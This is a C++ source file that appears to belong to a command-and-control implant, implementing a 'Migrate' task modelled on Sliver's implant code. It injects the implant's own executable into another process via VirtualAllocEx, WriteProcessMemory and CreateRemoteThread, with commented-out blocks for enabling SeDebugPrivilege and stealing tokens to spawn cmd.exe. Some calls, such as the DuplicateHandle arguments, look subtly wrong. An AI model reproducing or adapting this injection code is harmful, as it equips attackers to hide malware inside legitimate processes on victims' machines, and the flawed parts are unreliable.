#include "core/task.hpp"

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

namespace Task
{
    // Reference:
    // https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go#L135
    std::wstring Migrate(const std::wstring& wPid)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // BOOL bResult = FALSE;

        HANDLE hCurrProcess;
        // HANDLE hCurrToken;
        // LUID fLuid;
        // BOOL bCheckPrivilege = FALSE;

        hCurrProcess = GetCurrentProcess();

        // if (!OpenProcessToken(hCurrProcess, TOKEN_ALL_ACCESS, &hCurrToken))
        // {
        //     return L"Error: Failed to open the current process token.";
        // }

        // // Check if the current process has required privileges.
        // // const wchar_t* cRequiredPrivs[] = {SE_ASSIGNPRIMARYTOKEN_NAME, SE_TCB_NAME};
        // const wchar_t* cRequiredPrivs[] = {SE_DEBUG_NAME};

        // BOOL requiredPrivOK = TRUE;
        // for (int i = 0; i < 1; i++)
        // {
        //     if (!System::Priv::CheckPrivilege(hCurrToken, (LPCTSTR)cRequiredPrivs[i]))
        //     {
        //         requiredPrivOK = FALSE;
        //         break;
        //     }
        // }

        // // If the current process does not have required privileges, try to set privileges.
        // if (!requiredPrivOK)
        // {
        //     // Try to set the necessary privileges.
        //     // HANDLE hCurrentProcessToken;
        //     // OpenProcessToken(
        //     //     GetCurrentProcess(),
        //     //     TOKEN_ALL_ACCESS,
        //     //     &hCurrentProcessToken
        //     // );
        //     const wchar_t* privs[9] = {
        //         // SE_ASSIGNPRIMARYTOKEN_NAME,     // L"SeAssignPrimaryTokenPrivilege",
        //         // SE_TCB_NAME,                    // L"SeTcbPrivilege",
        //         // SE_CREATE_GLOBAL_NAME,          // L"SeCreateGlobalPrivilege",
        //         SE_DEBUG_NAME,                  // L"SeDebugPrivilege",
        //         // SE_IMPERSONATE_NAME,            // L"SeImpersonatePrivilege",
        //         // SE_INCREASE_QUOTA_NAME,         // L"SeIncreaseQuotaPrivilege",
        //         // SE_PROF_SINGLE_PROCESS_NAME,    // L"SeProfileSingleProcessPrivilege",
        //         // SE_SECURITY_NAME,               // L"SeSecurityPrivilege",
        //         // SE_SYSTEM_ENVIRONMENT_NAME,     // L"SeSystemEnvironmentPrivilege"
        //     };
        //     for (int i = 0; i < 9; i++)
        //     {
        //         if (!System::Priv::SetPrivilege(hCurrToken, privs[i], TRUE))
        //         {
        //             return L"Error: The current process does not have required privileges.";
        //         }
        //     }
        // }

        // Get the current process executable file name to migrate.
        WCHAR execName[MAX_PATH*4];
        // // DWORD dwSize = 0;
        LPCWSTR lpExecPath;

        DWORD dwFileLen = GetProcessImageFileNameW(
            hCurrProcess,
            const_cast<LPWSTR>(execName),
            MAX_PATH*4
        );
        if (dwFileLen == 0)
        {
            return L"Error: Failed to get the current process executable file name.";
        }

        // // Get full path for the executable file.
        lpExecPath = PathFindFileNameW((LPCWSTR)execName);

        // Read the executable file data to write process memory.
        std::vector<char> vData = System::Fs::ReadBytesFromFile(std::wstring(lpExecPath));
        SIZE_T dataSize = vData.size() * sizeof(char);

        // ******************
        // MIGRATION
        // ******************

        // HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
        // if (!hTargetProcess)
        // {
        //     return L"Error: Could not open the target process.";
        // }

        // LPVOID lpAddr = VirtualAllocEx(
        //     hTargetProcess,
        //     NULL,
        //     dataSize,
        //     MEM_COMMIT | MEM_RESERVE,
        //     PAGE_EXECUTE_READWRITE
        // );
        // if (!lpAddr)
        // {
        //     return L"Error: Failed to allocate virtual memory in target process.";
        // }

        // SIZE_T dwWritten;
        // if (!WriteProcessMemory(
        //     hTargetProcess,
        //     lpAddr,
        //     vData.data(),
        //     dataSize,
        //     &dwWritten
        // ) || dwWritten != dataSize) {
        //     return L"Error: Failed to write target process memory.";
        // }

        // HANDLE hThread = CreateRemoteThread(
        //     hTargetProcess,
        //     NULL,
        //     0,
        //     (LPTHREAD_START_ROUTINE)lpAddr,
        //     NULL,
        //     0,
        //     NULL
        // );
        // if (!hThread)
        // {
        //     return L"Error: Failed to create remote thread on the target process.";
        // }




        // HANDLE hNewToken;
        // if (!OpenProcessToken(hTargetProcess, TOKEN_ALL_ACCESS, &hNewToken))
        // {
        //     return L"Error: Could open the process token.";
        // }
        // // SLEEP(500);

        // HANDLE hPrimaryToken;
        // if (!DuplicateTokenEx(
        //     hNewToken,
        //     MAXIMUM_ALLOWED,
        //     NULL,
        //     SecurityImpersonation,
        //     TokenPrimary,
        //     &hPrimaryToken
        // ))
        // {
        //     // Denied to duplicate process tokens.
        // }
        // // SLEEP(1000);

        // // Try to execute new process with duplicated tokens.
        // STARTUPINFO si;
        // PROCESS_INFORMATION pi;
        // DWORD dwFlag;

        // ZeroMemory(&si, sizeof(si));
        // si.cb = sizeof(si);
        // si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
        // ZeroMemory(&pi, sizeof(pi));
        
        // std::wstring wCmd = L"C:\\Windows\\System32\\cmd.exe";
        // // SLEEP(500);
        // if (!CreateProcessWithTokenW(
        //     hPrimaryToken,
        //     0x00000001,
        //     NULL,
        //     (LPWSTR)wCmd.c_str(),
        //     dwFlag,
        //     NULL,
        //     NULL,
        //     &si,
        //     &pi
        // ))
        // {
        //     return L"Error: Could not create a new process with extracted token.";
        // }


        HANDLE hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwPid);
        if (!hTargetProcess)
        {
            return L"Error: Could not open the target process.";
        }

        HANDLE hDuplProcess;

        DuplicateHandle(
            hTargetProcess,
            hCurrProcess,
            hCurrProcess,
            &hDuplProcess,
            0,
            FALSE,
            DUPLICATE_SAME_ACCESS
        );

        LPVOID lpRemoteAddr = VirtualAllocEx(
            hDuplProcess,
            NULL,
            dataSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );

        SIZE_T dwWritten;
        if (!WriteProcessMemory(
            hDuplProcess,
            lpRemoteAddr,
            vData.data(),
            dataSize,
            &dwWritten
        ) || dwWritten != dataSize) {
            return L"Error: Failed to write target process memory.";
        }

        //
        // DWORD dwOldProtect;
        // VirtualProtextEx(
        //     hDuplProcess,
        //     lpRemoteAddr,
        //     dataSize,
        //     PAGE_EXECUTE_READ,
        //     &oldProtect
        // );


        HANDLE hThread = CreateRemoteThread(
            hDuplProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)lpRemoteAddr,
            NULL,
            0,
            NULL
        );
        if (!hThread)
        {
            return L"Error: Failed to create remote thread on the target process.";
        }

        // Terminate the current (original) process.
        // if (!TerminateProcess(hCurrProcess, EXIT_SUCCESS))
        // {
        //     return L"Error: Failed to terminate the current process.";
        // }

        return L"Success: Migrated successfully.";
    }
}
